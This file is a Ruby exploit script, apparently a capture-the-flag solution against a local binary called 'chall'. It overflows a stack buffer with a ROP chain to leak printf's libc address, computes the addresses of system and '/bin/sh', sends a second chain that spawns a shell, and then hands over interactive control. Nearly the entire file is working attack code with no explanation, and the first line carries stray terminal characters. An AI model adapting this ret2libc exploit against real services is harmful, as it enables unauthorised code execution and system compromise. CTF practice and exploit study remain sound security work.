#!/usr/bin/env ruby65;6800;1c
# coding: ascii-8bit

require 'pwn'

host = "localhost"
port = "8888"
libc = ELF.new("/lib/x86_64-linux-gnu/libc.so.6")
libc_system_offset = 0x50d70
libc_bin_sh_offset = 0x1d8698

if ARGV[0] == "r"
    host = "localhost"
    port = "8888"
    libc = ELF.new("libc.so.6")
    libc_system_offset = 0x50d60
    libc_bin_sh_offset = 0x1d8698
end

$z = Sock.new host, port
def z; $z; end

elf = ELF.new("chall")


printf_got_address = 0x403fd0
jmp_printf_address = 0x401030
ret_address = 0x401192
gadget_address = 0x40115a
main_1_address = 0x401160

payload = "A" * 40
payload += p64(gadget_address)
payload += p64(printf_got_address)
payload += p64(ret_address)
payload += p64(jmp_printf_address)
payload += p64(main_1_address)

z.recvuntil(": ")
z.sendline payload
data = z.recvuntil(": ")

libc_leak = u64(data[0,6].ljust(8, "\x00"))
libc_base = libc_leak - libc.symbols["printf"]
libc_system = libc_base + libc_system_offset
libc_bin_sh = libc_base + libc_bin_sh_offset

puts "[*] libc leak: #{libc_leak.to_s(16)}"
puts "[*] libc base: #{libc_base.to_s(16)}"
puts "[*] libc system: #{libc_system.to_s(16)}"
puts "[*] libc /bin/sh: #{libc_bin_sh.to_s(16)}"

payload = "B" * 40
payload += p64(gadget_address)
payload += p64(libc_bin_sh)
payload += p64(ret_address)
payload += p64(libc_system)

z.sendline payload
z.interact